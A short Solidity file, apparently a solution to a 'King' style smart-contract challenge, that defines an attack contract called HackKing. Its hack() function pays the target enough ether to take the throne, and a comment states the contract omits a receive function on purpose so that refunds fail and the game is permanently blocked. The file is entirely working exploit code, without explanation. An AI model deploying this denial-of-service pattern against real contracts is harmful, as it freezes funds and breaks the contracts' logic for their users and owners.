pragma solidity ^0.8.0;

contract HackKing {

    constructor(){}

    function hack(address _kingContract) external payable {
        uint256 kingContractBal = _kingContract.balance;
        require(msg.value >= kingContractBal, "INSUFFICIENT VALUE");

        (bool success, ) = payable(_kingContract).call{value: msg.value}("");
        require(success, "HACK FAILED");
    }

    // receive()... -> No receive function, to DOS the game logic
}